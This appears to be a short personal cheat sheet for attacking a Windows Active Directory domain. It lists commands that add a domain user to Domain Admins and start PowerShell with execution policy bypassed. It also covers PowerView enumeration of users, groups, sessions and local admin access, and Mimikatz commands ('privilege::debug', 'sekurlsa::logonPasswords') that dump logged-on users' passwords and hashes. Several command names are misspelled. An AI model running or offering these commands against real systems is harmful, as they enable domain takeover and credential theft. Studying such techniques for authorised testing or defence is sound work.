sysdm.cpl   #computer config
dsa.msc  #AD mgr,add delete user
net userusername passwd /add /domain     #add domain user
net group "Domain Admins" clare /add /domain   #add a user to dmmain admin group
gpupdate /force      #update the gp group policy. \n

net share sharename=c:\foldername          # share a folder
setspn HTTP/nameofhost(sql.inmy.com) inmy\sqladmin

powershell.exe -nop -exec bypass  #fireup the powershell



#Powerview to emulate the domain infor
  Import-Module .\PowerView.ps1
  Get-NetDOmain


  Get-NetUser | select cn

  Get-NetGroup
  Get-NetComputer

  Find-LocalAdminAccess  #important

  Get_NetSession -ComputerName $computerName  #get other user which has net session with this host& not guarantee to use
    
  Get-NetLoggedon -ComputerName $cumputername # get remote access from other user. & not guarantee to use


#mimikaz
  privilege::debug    #run this first, to test the privi of mimikaz

  sekurlsa::logonPasswords  #to view the passwd or passwd hash of user login this host


  
  
  

  
